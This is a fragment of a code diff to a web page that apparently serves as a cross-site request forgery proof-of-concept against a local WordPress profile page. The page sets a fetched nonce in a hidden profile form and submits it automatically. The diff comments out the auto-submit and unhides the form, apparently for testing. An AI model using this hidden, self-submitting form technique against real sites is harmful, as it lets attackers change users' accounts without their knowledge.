@@ -19,7 +19,7 @@
 				jQuery( '#_wpnonce' ).val( nonce_code_new );
 				
 				
-				jQuery( '#alexandru' ).find( 'p.submit' ).children( 'input' ).click();
+			//	jQuery( '#alexandru' ).find( 'p.submit' ).children( 'input' ).click();
 
 			} else {
 				console.log( 'Getting URL data failed! (No internet connection?)' );
@@ -35,7 +35,7 @@
 
 <body>
 
-<div id="alexandru" style="display: none;">
+<div id="alexandru">
 
 <form id="your-profile" action="http://localhost/wordpresslastmu/wp-admin/profile.php" method="post" novalidate="novalidate">
 				<input type="hidden" id="_wpnonce" name="_wpnonce" value="1fd9320c57"><input type="hidden" name="_wp_http_referer" value="/wordpresslastmu/wp-admin/profile.php?wp_http_referer=%2Fwordpresslastmu%2Fwp-admin%2Fusers.php">									<input type="hidden" name="wp_http_referer" value="/wordpresslastmu/wp-admin/users.php">
